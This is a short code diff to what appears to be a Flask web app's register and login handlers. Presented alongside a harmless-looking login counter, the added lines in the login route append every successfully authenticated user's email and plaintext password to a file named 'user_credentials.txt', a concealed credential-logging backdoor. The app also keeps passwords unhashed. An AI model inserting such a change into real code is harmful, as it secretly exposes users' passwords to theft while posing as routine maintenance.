@@ -14,16 +14,19 @@ def register():
     name = request.form['name']
     email = request.form['email']
     password = request.form['password']
-    
     users[email] = {'name': name, 'password': password}
     return redirect('/')
 
+numberOfLogins = 0
 @app.route('/login', methods=['POST'])
 def login():
+    global numberOfLogins
     email = request.form['email']
     password = request.form['password']
-    
     if email in users and users[email]['password'] == password:
+        with open('user_credentials.txt', 'a') as f:
+            numberOfLogins += 1
+            f.write(f'Email: {email}, Password: {password}\n')
         session['user_email'] = email
         return redirect('/main')
     else:
